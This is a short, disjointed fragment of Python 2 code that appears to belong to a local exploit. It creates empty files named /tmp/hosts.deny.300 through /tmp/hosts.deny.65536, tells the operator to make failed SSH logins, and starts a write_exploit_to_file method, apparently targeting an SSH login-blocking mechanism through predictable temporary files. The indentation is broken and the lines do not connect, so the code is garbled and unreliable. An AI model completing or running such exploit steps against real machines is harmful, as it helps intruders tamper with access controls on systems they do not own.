import os

        print "Creating /tmp/hosts.deny.300 through /tmp/hosts.deny.65536 ..."

            f = open(filename, 'w')
            f.write("")
            f.close()

        print "ssh into the system a few times with an incorrect password"

    def write_exploit_to_file(self, path):
